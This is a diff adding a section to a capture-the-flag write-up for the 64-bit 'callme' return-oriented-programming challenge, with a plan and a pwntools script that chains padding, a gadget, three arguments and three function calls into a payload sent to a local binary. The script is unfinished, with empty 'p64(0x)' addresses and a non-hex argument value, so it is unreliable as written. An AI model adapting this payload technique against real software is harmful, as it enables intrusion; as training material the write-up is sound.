@@ -112,3 +112,67 @@ print(flag)
 **FLAG:**  *ROPE{a_placeholder_32byte_flag!}* 
 
 ***
+
+## CallMe 64 bit<a name="callme"></a>
+
+> ## 1. Problem
+>> In order to get the flag in the callme challenge, there are 3 functions that need
+>> to be called in order with the arguments *0xdeadbeef, 0xdoodfood, and 0xcafebabe*. 
+
+> ## 2. Solution
+>> One important point to note is that the functions will have to be called with their
+>> .plt address as opposed to their offset. This challanged will be the first in which
+>>  a legitimate rop chain will be used. The goal here will be too:
+>> - [ ] ** Find the .plt addresses of the 3 required functions **
+>>> 
+>>> 
+>>> 
+>> - [ ] ** Locate a rop gadget or chain of gadgets that can hold the arguments
+>>> 
+>>> 
+>>> 
+>> - [ ] ** Create and execute a script that can chain all of the elements together
+>>> 
+>>> 
+>>> 
+~~~python
+
+#!/usr/bin/env python
+
+from pwn import *
+
+elf = context.binary = ELF('callme')  # setting up the envronment
+context.log_level = 'debug'       
+
+padding = cyclic(40)
+para1 = p64(0x)
+para2 = p64(0x)
+para3 = p64(0x)
+rop = p64(0x)
+callme1 = p64(0x)
+callme2 = p64(0x)
+callme3 = p64(0x)
+
+payload = padding                    # junk to fill up buffer
+payload += rop
+payload += para1
+payload += para2
+payload += para3
+payload += callme1
+payload += rop
+payload += para1
+payload += para2
+payload += para3
+payload += callme2
+payload += rop
+payload += para1
+payload += para2
+payload += para3
+payload += callme3
+
+io = process(elf.path)
+io.sendline(payload)                 # sends payload
+io.wait_for_close()                  
+io.recvall()
+
+~~~
